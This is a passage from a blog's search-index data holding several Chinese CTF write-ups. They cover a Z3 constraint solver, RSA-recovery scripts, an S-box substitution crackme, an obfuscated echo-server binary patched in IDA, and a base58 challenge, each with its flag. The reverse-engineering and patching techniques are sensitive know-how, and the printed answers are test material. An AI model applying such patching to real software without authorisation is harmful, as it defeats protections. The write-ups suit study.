) s.add( 56 * a1[8] + 74 * a1[5] + 43 * a1[4] + 84 * a1[3] + 44 * a1[2] + 37 * a1 + 81 * a1[1] + 2 * a1[6] + 21 * a1[9] == 35933 ) s.add( 36 * a1[16] + 98 * a1[14] + 79 * a1[10] + 97 * a1[11] + 33 * a1[12] + 60 * a1[15] + 24 * a1[17] + 78 * a1[18] + 72 * a1[19] == 47783 ) s.add( 74 * a1[17] + 39 * a1[16] + 51 * a1[15] + 8 * a1[14] + 77 * a1[13] + 69 * a1[12] + 16 * a1[11] + 73 * a1[10] + (a1[18] &lt;&lt; 6) + 28 * a1[19] == 44266 ) s.add( 47 * a1[18] + 52 * a1[17] + 53 * a1[16] + 99 * a1[15] + a1[14] + 38 * a1[13] + 67 * a1[12] + 45 * a1[11] + 61 * a1[10] + 66 * a1[19] == 44988 ) s.add( 5 * a1[17] + 4 * a1[13] + 89 * a1[12] + 31 * a1[10] + 11 * a1[11] + 93 * a1[14] + 3 * a1[15] + 84 * a1[16] + 65 * a1[18] + 100 * a1[19] == 46698 ) s.add( 82 * a1[16] + 62 * a1[13] + 58 * a1[12] + 42 * a1[11] + 86 * a1[10] + 85 * a1[14] + 27 * a1[15] + 43 * a1[17] + 15 * a1[18] + 26 * a1[19] == 45689 ) s.add( 22 * a1[16] + 34 * a1[13] + 2 * a1[12] + 23 * a1[11] + 46 * a1[10] + 29 * a1[14] + 48 * a1[15] + 35 * a1[17] + 19 * a1[18] + 70 * a1[19] == 27224 ) s.add( 96 * a1[18] + 81 * a1[17] + 92 * a1[15] + 54 * a1[14] + 94 * a1[11] + 57 * a1[10] + 55 * a1[12] + 80 * a1[13] + 71 * a1[16] + 25 * a1[19] == 58395 ) s.add( 13 * a1[17] + 75 * a1[13] + 21 * a1[11] + 59 * a1[10] + 56 * a1[12] + 50 * a1[14] + 41 * a1[15] + 44 * a1[16] + 40 * a1[18] + 49 * a1[19] == 40625 ) s.add( 12 * a1[16] + 91 * a1[14] + 88 * a1[13] + 87 * a1[12] + 68 * a1[10] + 7 * a1[11] + 83 * a1[15] + 20 * a1[17] + 32 * a1[18] + 37 * a1[19] == 45008 ) s.add( 10 * a1[17] + 18 * a1[16] + 9 * a1[15] + 6 * a1[14] + 76 * a1[10] + 14 * a1[11] + 17 * a1[12] + 90 * a1[13] + 63 * a1[18] + 30 * a1[19] == 32400 ) s.add( 83 * a1[26] + 45 * a1[25] + 4 * a1[24] + 48 * a1[22] + 38 * a1[20] + 22 * a1[21] + 7 * a1[23] + 62 * a1[27] + 25 * a1[28] + 85 * a1[29] == 37450 ) s.add( 14 * a1[28] + 86 * a1[26] + 93 * a1[25] + 42 * a1[24] + 94 * a1[21] + 70 * a1[20] + 58 * a1[22] + 40 * a1[23] + 76 * a1[27] + 11 * a1[29] == 48740 ) s.add( 72 * a1[28] + 46 * a1[26] + 92 * a1[25] + 98 * a1[24] + 55 * a1[23] + 80 * a1[20] + 32 * a1[21] + 12 * a1[22] + 84 * a1[27] + 27 * a1[29] == 53599 ) s.add( 53 * a1[27] + 49 * a1[23] + 99 * a1[22] + 41 * a1[20] + 20 * a1[21] + 87 * a1[25] + 81 * a1[26] + 71 * a1[28] + 73 * a1[29] == 52140 ) s.add ( 68 * a1[28] + 61 * a1[21] + 28 * a1[20] + 91 * a1[22] + 31 * a1[23] + 67 * a1[24] + 15 * a1[25] + 44 * a1[26] + 6 * a1[27] + (a1[29] &lt;&lt; 6) == 44449 )s.add( 9 * a1[27] + 60 * a1[25] + 96 * a1[23] + 17 * a1[20] + 10 * a1[21] + 29 * a1[22] + 5 * a1[24] + 100 * a1[26] + 21 * a1[28] + 69 * a1[29] == 35276 )s.add( 59 * a1[26] + 66 * a1[25] + 23 * a1[22] + 8 * (a1[20] + 3 * a1[21]) + 16 * a1[23] + 56 * a1[24] + 90 * a1[27] + 36 * a1[28] + 39 * a1[29] == 35577 ) s.add( 35 * a1[25] + 65 * a1[23] + 63 * a1[22] + 75 * a1[20] + 88 * a1[21] + 33 * a1[24] + 82 * a1[26] + 18 * a1[27] + a1[28] + 37 * a1[29] == 42004 )s.add( 54 * a1[28] + 57 * a1[27] + 43 * a1[24] + 74 * a1[21] + 19 * a1[20] + 51 * a1[22] + 13 * a1[23] + 79 * a1[25] + 3 * a1[26] + 26 * a1[29] == 35802 )s.add( 34 * a1[28] + 50 * a1[27] + 78 * a1[26] + 52 * a1[25] + 77 * a1[24] + 95 * a1[23] + 30 * a1[22] + 89 * a1[20] + 2 * a1[21] + 97 * a1[29] == 54527 )s.add( 46 * a1[36] + 73 * a1[34] + 15 * a1[30] + 16 * a1[31] + 41 * a1[32] + 94 * a1[33] + 28 * a1[35] + 45 * a1[37] == 34469 )s.add( 82 * a1[36] + 10 * a1[32] + 48 * a1[31] + 65 * a1[30] + 6 * a1[33] + 30 * a1[34] + 27 * a1[35] + 32 * a1[37] == 31558 ) s.add( 62 * a1[36] + 39 * a1[35] + 36 * a1[33] + 97 * a1[31] + 52 * a1[30] + 70 * a1[32] + 13 * a1[34] + 66 * a1[37] == 41820 ) s.add( 44 * a1[34] + 42 * a1[33] + 78 * a1[32] + 83 * a1[31] + 96 * a1[30] + 4 * a1[35] + 9 * a1[36] + 51 * a1[37] == 38668 ) s.add( 79 * a1[36] + 37 * a1[33] + 92 * a1[30] + 18 * a1[31] + 86 * a1[32] + 7 * a1[34] + 95 * a1[37] == 45530 )s.add( 71 * a1[36] + 43 * a1[35] + 57 * a1[34] + 49 * a1[33] + 88 * a1[32] + 61 * a1[30] + 24 * a1[31] + 91 * a1[37] == 51396 ) s.add( 34 * a1[36] + 75 * a1[35] + 35 * a1[32] + 23 * a1[30] + 3 * a1[31] + 53 * a1[33] + 14 * a1[34] + 47 * a1[37] == 28874 ) s.add( 22 * a1[36] + 84 * a1[35] + 26 * a1[34] + 90 * a1[33] + 99 * a1[30] + 98 * a1[31] + 25 * a1[32] + a1[37]==38231 )solver.check()result = solver.model() flag = ''for i in range(0,36): flag += chr(result[a[i]].as_long().real)print (flag) 名字没想好前一部分 from Crypto.Util.number import *import gmpy2e = 103738# e = 2*27361n = 24511956296934419790810802924028121267308277322350201914243748724443965915830044792139346496470216715543376102606906727287935669186132061565360428924230740995935556111187855700300365517739695893842582114724005232045077425187550801509268664723237890122110051088839310003135672964413501812829310021228720112275276180469100308793523051405119335989674132224715582989624204590983857159312466387546505666052162775188773736419909262619409755848412558718676873188073997893894862353873441073313610102773845304906678909624700529896455885309546409645526387707907518497436045821973310653257012148438207441605902771515486273283273gift = 12255978148467209895405401462014060633654138661175100957121874362221982957915022396069673248235108357771688051303453363643967834593066030782680214462115370497967778055593927850150182758869847946921291057362002616022538712593775400754634332361618945061055025544419655001567836482206750906414655010614360056137481173664901476116870144816992211793902146834987166288769615612767704010592138813256140678199511291489394523989294805910740127557682458229594376211232977501267410539674224065875285801753027816046254818608535462445306054117075379711073762930279723764342988824053970592468109679774789092077979655857748513636834c = 7357116532209949285136310518084676100522798730487701269950303460540634127932201594120600757671807456790592531487713433579926404640474277692592102315472760853853767347752080563508622523821339163225554653816787201616233932746815764392729597579461985789538131853246938443458331139199802764554726447278501492140335824365867574318693890007499638038064582031311613039571335453968072426153706431456149868515230310567240569544961967582304893471240728585336273245259533905230737876248875784828430507371662455796543123714325161987112223947057481814610592300979207673818538093532100233028106442070524965861451563388404227738574# gift = 8 * 11 * 97 * 9601 * 26057167557433418766727399341516665922795024485718296827775927226598694152064298989740080209950805089159979564300359652085874056289167084685303669920341402021998569251561854184586912056788515477034039863935829715784489123437315798902409373317578932823488000322365526936227790036245092665207472438169954702748857842187299166976320465787901470261800372425345547560303561842376571751928531743505412746346436473024093575122041981043859827477404447458211341273671273506575488189374812217939984540494633634622813448773520886788206836310702581026986331011987344147901504555559723572981774237352245997308787165273589print(len(bin(gift)[2:]))print(len(bin(n)[2:]))# gift * gcd = (p-1) * (q-1)# gift % gcd = 0for gcd_val in range(4, 8): phi = gift * gcd_val try: d = gmpy2.invert(e // 2, phi) m_2 = pow(c, int(d), n) flag = long_to_bytes(gmpy2.isqrt(m_2)) print(flag) except ZeroDivisionError: continue 后一部分 import gmpy2import Crypto.Util.numberimport sympyd = 14519297697723031496224953772301033569165883208616356699837703756220717249229195213146695656923357394378868735444167631602696573904678412172248043414276910206086892084385988564720914312238316434518024995169814463252129242492227202678878240875905293369168263909256455159691392124769949072754243536472227070447391890140409479709945084894060833468804156778720190688101601664725009609222256314873780002770605127043596912060811904733471592387441742111474341938658516761896926403628885365926903655309306738689809023277824030268579979837642613499180913999651379232105756338399243024739524553588216117189742912479604441636257#d = 14519297697723031496224953772301033569165883208616356699837703756220717249229195213146695656923357394378868735444167631602696573904678412172248043414276910206086892084385988564720914312238316434518024995169814463252129242492227202678878240875905293369168263909256455159691392124769949072754243536472227070447391890140409479709945084894060833468804156778720190688101601664725009609222256314873780002770605127043596912060811904733471592387441742111474341938658516761896926403628885365926903655309306738689809023277824030268579979837642613499180913999651379232105756338399243024739524553588216117189742912479604441636257#c = 23574157314515030841894399693996910252287747536395985840285410194536546768646580704111053676040921830550019965767796038280932469005359270920519250763405535872475345625907947986452218739530197421244240070129909526493952916306821311836861766221812155261751444946282559677005557815746813525162411907545113665605490915464367483833005576787591204417525937745572210195816236947103271664048065491627347939268785403334419989160034526164012966888952162714736497312282011026789187871221751240709801544484784941178786820290118585681595783245449236394480319395321877182096839866054466492123200354772280398476167002177544154960579c = 23574157314515030841894399693996910252287747536395985840285410194536546768646580704111053676040921830550019965767796038280932469005359270920519250763405535872475345625907947986452218739530197421244240070129909526493952916306821311836861766221812155261751444946282559677005557815746813525162411907545113665605490915464367483833005576787591204417525937745572210195816236947103271664048065491627347939268785403334419989160034526164012966888952162714736497312282011026789187871221751240709801544484784941178786820290118585681595783245449236394480319395321877182096839866054466492123200354772280398476167002177544154960579e = 0x10001# 有 c d e 我们知道e*d = 1 %(p-1)(q-1) 则e*d-1 = k* （p-1)*(q-1）# 可以爆破k要得到(p-1)(q-1)#取k的范围 ed - 1是2063到2064位 、 （p-1）（q-1）是1024+1024位 则k取2**15~2**16 for i in range(1000,3000): if e*d-1 &gt; 2**i and e*d-1&lt;2**(i+1): print(i) break #2063# (e*d-1)对k的模为0# 我们还知道q是p的下一个素数 俩者大小相差不大 for k in range(2**14,2**16): if (e*d-1) % k==0: p = sympy.prevprime(gmpy2.iroot((e*d-1)//k,2)[0]) #通过sympy.prevprime(n)得到小于n的最大素数 #gmpy2.iroot开方函数输出的是一个元组 q = gmpy2.next_prime(p) # print(q) # print(p) if (e*d-1)//k == (q-1)*(p-1): #验证pq是否正确 breakn = q * pprint(n)m = pow(c ,d ,n )#print(byte1s.fromhex(hex(m)[2:]))import binasciiprint(binascii.unhexlify(hex(m)[2:]))#print(Crypto.Util.number.long_to_bytes(m)) Merry_Christmasimport gmpy2from gmpy2 import *from Crypto.Util.number import *n=17539423546879883396629573776616418986256902147283732214295946312835113344061142956076117932720247053739715326040027048199629442201144987405090572982720131052885163184811793669071684926986445262835990861167700118224153436202178098707759605979066475651999711718728200184335695206586643579499656822346329750835696158561669170301767928780361376643304324731146650458384564533895090608529488304659924485356518526226061081943815971670656857778229528022465452008890430046982169571771039198877713729197033434033303723925335811353531172899520232033290866272195248554656110282928669639257994965701208856346298076998993772423097c=5560694632613114538708358450844738346732427106497566176686415566542021811907746171660858360055720615188679328728275250111979427060322426593068123630729075838980217642604281020733578019517061369665467249555496690538379316251258553434263030485822069081031041121329559075841297923650799241347196473466430248261213536319894271629049899379974582453405472218720572088937075254938460083046946717784821298765199164644879680847984441166684509290675197526982405556980540919856072198191306527746754844792294221564010770506298266272017613487725494001276623402987809305696759434595799863487759478902384039066714073292949058853003n1=21465819616864492551767155722996412718832402997933699784091937387760830726039866762857450959675228856561597024318920734312362144261628290737563681759442171285581931041622345778933572673367607809994811354957971820829401430301563611970709279094237597394734599103937206689348004861322161582747568764567491894069565665829828570957338594421227530701263883322496237907509301547209937444268813162260988374157151529111924866290775985684107622034449136081744171954609262107449388993051611516007232903948144186151363436032658716266030263647775582015141329829060294352706551807295555026827381280240539020513044515406829846588787c1=19585478304129650368934167685581947379018238627360258251578178648406399091655911309790559870365866290321783969820131014958701556570645863667895395615377725655139970869868226237575462206775170966585306390686724869174973947234608655786245191308423334769172394586099003865664934720651493266130413617892286830586179842568659758155132923079476873190047514962385696606866440573294836559927597496331643346032100075257329902065785369011323134807157288931237650262052445952481912276967263237183320639027956890814569212814115581834172475173790422964999583755677956698930811772293980516268488171908878145019531149798750799613142gift1=21073862899796816496314528055339279280335681203948249072101881208021752125789533267427994742277358208178070970462447090818216561770563907183494712376741842209323406667050344266668347773728401520981152006053958337605219297650281680615939792818684114311810254344598007357629176456353064311734075462353266893546853648829947081541158912147691654438830914577857503519080776224006347318623082457516638594584206488534978134212723395494600005197454325625290580653432901204502054226866606652982669196910942405139803194404497913820850500332680877820694279428529873469583387698995104411071804749202120283361058269192420218572231gift2=7634352822409241151514235360777296908269419654786551951076299092182838191720014827302929726661609788893676185300000003824161794580145215813570705896440007085639728197111313542046542236060921056046727832889041640187683808320443684484085665265794806366182119574554965179974119587542057100849953753232435527244682735108194058759240757296546820383552711669453408694460188770050594702462736564767783116432265746800810795602828775783509056534518928775187835786128676790426643882842096826044057116388930041087679950264956074503205229333151001519229166174531496272703271636344792947552939606533888390978361247276796123693665t1=pow(gift1,691,n1)t2=pow(gift2,587,n1)x1=t1-t2x2=t2-t1xx = gmpy2.gcd(x2,n1)p1=xx#p1 = 111260936618891036068652208614496645952776413871721160526197362367054114767347494528257565447229196035984168278796498545668532710414950556409048002275825950676900234517459096095264009412617416429176073580216701699837149712564123810225413587649986801062654943062839747848949602864178056960224292368694023834399e1 = 979691q1 = n1//p1p1 = mpz(p1)q1 = mpz(q1)e1 = mpz(e1)phi1 = (q1-1) * (p1-1) d1 = gmpy2.invert(e1, phi1)p = pow(c1,d1,n1)print(p)q = n//p#print(isPrime(p))#print(isPrime(q))e = 65537p = mpz(p)q = mpz(q)e = mpz(e)phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c,d,n)print(long_to_bytes(m))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"Replace","slug":"Replace","date":"2020-12-18T10:04:36.674Z","updated":"2021-01-11T01:42:35.049Z","comments":true,"path":"2020/12/18/Replace/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/18/Replace/","excerpt":"2018湘湖杯逆向题","text":"2018湘湖杯逆向题 首先先查看文件 upx壳，32位文件，于是拖入kali下手动脱壳。 把已经脱壳的文件拖入ida中查看，反编译 里面有个重点输入buf必须是35长度进入sub_401090函数看看 signed int __fastcall sub_401090(int a1, int a2)&#123; int v2; // ebx int v4; // edx char v5; // al int v6; // esi int v7; // edi char v8; // al int v9; // eax char v10; // cl int v11; // eax int v12; // ecx v2 = a1; if ( a2 != 35 ) return -1; v4 = 0; while ( 1 ) &#123; v5 = *(_BYTE *)(v4 + v2); v6 = (v5 &gt;&gt; 4) % 16; v7 = (16 * v5 &gt;&gt; 4) % 16; v8 = byte_402150[2 * v4]; if ( v8 &lt; 48 || v8 &gt; 57 ) v9 = v8 - 87; else v9 = v8 - 48; v10 = byte_402151[2 * v4]; v11 = 16 * v9; if ( v10 &lt; 48 || v10 &gt; 57 ) v12 = v10 - 87; else v12 = v10 - 48; if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) ) break; if ( ++v4 &gt;= 35 ) return 1; &#125; return -1;&#125; 需要这个函数返回1 那肯定是要完成 if ( ++v4 &gt;= 35 )return 1; 那看看上面的函数逻辑 v5 = *(_BYTE *)(v4 + v2); v2被a1赋值,a1就是我们输入的buf v4从0开始每次循环+1接着看一下下面v6 = (v5 &gt;&gt; 4) % 16; v6=(输入的每个字符/16)%16v7 = (16 * v5 &gt;&gt; 4) % 16; v7= v5%16 v8 = unk_402150[2 * v4]; v8为一个数组中2v4的变量 我们暂且叫这个数组为arr1 v8=arr1[2v4] if ( v8 &lt; 48 || v8 &gt; 57 ) v9 = v8 - 87;else v9 = v8 - 48; 这一段是判断v8去对v9进行操作v10 = byte_402151[2 * v4];v10等于另外一个数组的2v4个元素 我们暂且叫这个数组为arr2 v10 = arr2[2v4] if ( v10 &lt; 48 || v10 &gt; 57 ) v12 &#x3D; v10 - 87;else v12 &#x3D; v10 - 48; 下面就是一个重点 这是整个代码的关键所在 在byte_4021A0这个数组中的16v6+v7的位置上的字符 需要和v11+v12对0x19的异或值相等才可以简洁而写就是byte_4021A0[16*v6+v7] == (v11+v12)^0x19 整理了所有逻辑后我们就去思维逆回去 我们需要有一个字符串 长度必须是35 而且字符串中每一个都在if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) )可以跳过 那可以想象得到 估计这个就是flag字符串了 那我们怎么得到这个字符串呢 最简单方法 爆破 从所有可见字符一个一个试试 看到哪一个成立就行 先看一下byte_4021A0，byte_402151 和 byte_402150数组中存的都是什么 可以看的出来byte_402151 和 byte_402150是连着的 byte_402150存的是2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6而byte_402151存的是 a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6 shift+E提取出byte_4021A0的数据 unsigned char ida_chars[] =&#123; 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;; 最后附上脚本 table = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]s = bytes.fromhex(\"2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6\")for i in range(len(s)): v = table.index(s[i]^0x19) print(chr(v), end='') 得到flag flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"echo-server","slug":"echo-server","date":"2020-12-17T07:57:25.682Z","updated":"2021-01-11T01:42:26.603Z","comments":true,"path":"2020/12/17/echo-server/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/17/echo-server/","excerpt":"XCTF 3rd-NJCTF-2017","text":"XCTF 3rd-NJCTF-2017 0x01.查壳使用ExeinfoPe工具查壳，可以发现是32位程序，没有壳 0x02.使用IDA进行反编译使用32位的IDA打开程序 0x03.分析程序题目提示”输入密钥，得到flag.”定位到main函数，并使用F5大法查看伪代码 这个程序的main函数伪代码比较清晰，根据伪代码可知程序main函数中只有一个关键函数，但是这个函数调用比较奇怪。猜测这里可能有问题。 ((void (*)(void))((char *)&amp;loc_80487C1 + 3))(); 我们切回汇编代码，直接看汇编代码 我们双击这个函数，跟去这个函数看下 双击后程序跳转到这里了，根据main函数中的那个call，我们可以知道，程序应该跳转到loc_80487C1+3处，但是跳转过来后，发现汇编代码却乱七八糟的，得知程序被混淆了；我们需要想办法去除花指令。在0x080487C1处按下D键把此处的汇编代码转换为数据，我在此处按了两次D键才转换完成。 0x80487C1处应该变成这样，我们发现0x80487C1处的字节是0xE8，这个0xE8经常用于混淆，使用IDA把它patch为0x90，在0x80487C2处按下C键，我们会看到IDA分析0x80487C2、0x80487C3的汇编代码显示正常，我们返回main函数看一眼那个call，发现那个call变成了call near ptr unk_80487C4，我们回到unk_80487C4处，按下C键。会发现IDA分析的汇编代码和正常的函数开通差不多了。 接着往下看 发现这里出现了一个和之前main函数中的函数调用一样诡异的jmp，jmp short near ptr loc_80487F3+1我们可以仔细观察一些，可以发现这条指令占了两个字节，这条指令本身的意思就是跳到自己的第二个字节处，因此我们可以理解为这题指令就是相当于把第一个字节nop掉。 我门看下机器码，发现0x80487F3处的字节0xE8，0xE8也经常被用于混淆，再结合我们上一步的分析，可以得知这里就是用0xE8来干扰IDA的静态分析，我们直接把0xE8patch为0x90。 然后可以观察到，又有一块汇编代码恢复正常。然后我发现0x08048816处有一个地址被IDA标红。我们观察下发现0x08048816前面的两行汇编代码相当于无条件跳转 xor eax, eaxjz short loc_804881D 然后在0x08048816后面发现有一处比较，其中一个参数是地址是0x8048817h，因此我猜测此处的0x08048816处的几个字节的数据可能不是代码，而是数据，使用D转换为数据看下 发现果然是数据，我们在0x08048817按A，把数据转为字符串 在字符串的下方有一处比较，还有一句”You are very close! Now patch me~”因此我们得知程序需要用户输入的字符串是”F1@gA”，我们运行程序尝试下 发现确实通过比较了，但是并未输出flag，程序提示需要patch，我们接着往下看，找下程序为什么会卡在这。 我们发现这里又有奇怪的跳转，我们使用之前的方法恢复下,尝试了下还是比较奇怪，先不管他，我有看到在”You are very close! Now patch me~”下方有个跳转 发现这里是根据dword_804A088的值来决定是否跳转的，在dword_804A088上按下X键，使用交叉引用，看下dword_804A088这个地址的值是哪来的， 过去看下 发现dword_804A088这个地址的值是在main函数中硬编码的1， 知道EAX的值为1，test eax,eax置z标志位为0，z标志位为0时jz不跳转，所以此处的jz没有跳转对此处进行patch，改为jmp，然后保存程序。 成功得到flag：F8C60EB40BF66919A77C4BD88D45DEF4","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"test_re","slug":"test_re","date":"2020-12-17T07:35:41.374Z","updated":"2021-01-11T01:42:43.950Z","comments":true,"path":"2020/12/17/test_re/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/17/test_re/","excerpt":"2019_西湖论剑_预选赛","text":"2019_西湖论剑_预选赛 Base58的码表：123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ 9位数字以及去掉了英文字母容易造成混淆的字母(0：数字零，O：大写O，I：大写i，l:小写L)所组成 编码流程： ① 将所要编码的字符串转为ASCII码（ASCII码实际上也就是256进制的数） 例如将”ABD”转为 65 66 68 ② 然后再将256进制转为10进制数，65256256+66*256+68=4276804 ③ 最后将十进制数转为58进制，即模58转化，最后得到21 53 20 0 ④ 根据21 53 20 0查表中所对应的字符得到base58编码的密文：nVm1 解码流程与其编码流程相反 总结，编码就是将所要加密的字符先转256进制，再转10进制再转为58进制，最后查码表；解码就是查码表得到58进制，再转10进制最后再转256进制最后通过ascii码表转为字符。 查壳，无壳，64位文件。 拖入ida查看主函数 经过分析，sub_400D00函数内容大致意思是输入字符串 查看sub_400700函数 根据意思，s应该是经过某种加密操作后的字符串，后面的D9 cS9N 等等应该就是密文了，密文应该是D9cS9N9iHjMLTdA8YSMRMp（仔细看s后面加了数字，如s+2），通过分析可以知道s被v11所赋值的，所以主要看v11，这里的过程还被加入了其他变量的操作来混淆，主要看有关v11的加密操作过程即可 根据上面base58的原理，所以这里的算法为base58的加密过程 将字符串D9cS9N9iHjMLTdA8YSMRMp进行解密即可 得到flag{base58_is_boring}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"网安作业-常见编码","slug":"URL编码","date":"2020-12-13T11:34:15.791Z","updated":"2020-12-17T08:14:45.149Z","comments":true,"path":"2020/12/13/URL编码/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/12/13/URL%E7%BC%96%E7%A0%81/","excerpt":"转载自海里大佬!","text":"转载自海里大佬! URL编码URI所允许的字符分作保留与未保留。保留字符是那些具有特殊含义的字符，例如：斜线字符用于URL（或URI）不同部分的分界符；未保留字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。 对保留字符的百分号编码首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置转义字符(“%“)，置入URI中的相应位置。 